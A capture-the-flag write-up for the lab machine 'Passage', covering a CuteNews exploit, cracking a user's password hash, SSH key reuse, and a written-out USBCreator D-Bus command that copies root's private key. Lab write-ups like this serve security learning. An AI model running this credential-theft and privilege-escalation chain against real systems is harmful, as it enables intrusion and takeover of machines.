# Passage
This box is a Linux made by ChefByzen and its IP is 10.10.10.206
We start by an nmap scan:
```
$ nmap -p- -sC -sV -oA nmap/complete 10.10.10.206
```

nmap shows port 22 with Ubuntu banner and port 80.
Lets check the website on the port 80;
Looks like some Hackernews clone with articles that can be commented.
Little line in the footer of the website says: "Powered by CuteNews";

Looking that up, cutenews is a free php content manager system.
Looking up cutenews cve, we immediately find this link:
`https://www.exploit-db.com/exploits/48800`
This exploit leverages CVE 2019-11447 ;
Using the exploit, we get dropped in a shell as `www-data`.

I've uploaded linpeas.sh, exfiled the report, then studied it;
----

In the ̀ /var/www/html/CuteNews/cdata/users a bunch of .php files contained
php serialized objects like this one:
```
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
```

Using an online php unserializer, we get the md5 hash for user paul-coles, ie
paul on the box.
Using crackstation we find that paul's password is atlanta1

```
$ su paul
Password: atlanta1
paul@passage:~$ cat /home/paul/user.txt | wc -c
33
```
we've owned user #1;
I've exfiled paul's ssh key to get a better shell.
Reading its public ssh key:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```
Well.
```
ssh -i paul-key nadav@10.10.10.206
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ ls
Desktop    Downloads         Music     Public     Videos
Documents  examples.desktop  Pictures  Templates
```
lmao.
we've owned user #2;

Based on .viminfo file found in /home/nadav, we found some history
log  of nadav's editing its user's capabilities with USBCreator for
Ubuntu.


---- PrivEsc Probably has to do with this:
https://www.exploit-db.com/exploits/36820

---

I took a break for the day and came back with fresh eyes on the problem
I immediately found this blog post
https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
It refers to some user nadav on Ubuntu using usbcreator cve.

Using this command, we are able to exfil root's ssh private key:

```
nadav@passage:$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true
nadav@passage:$ cat /tmp/pwn
-----BEGIN RSA PRIVATE KEY----
...
```

We exfil the key and use it to log into the box
as root
```
$ chmod 600 root-key
$ ssh -i root-key root@10.10.10.206
root@passage:~# ls
artifacts  files  root.txt
root@passage:~# cat root.txt | wc -c
33
```

We've owned the root account.
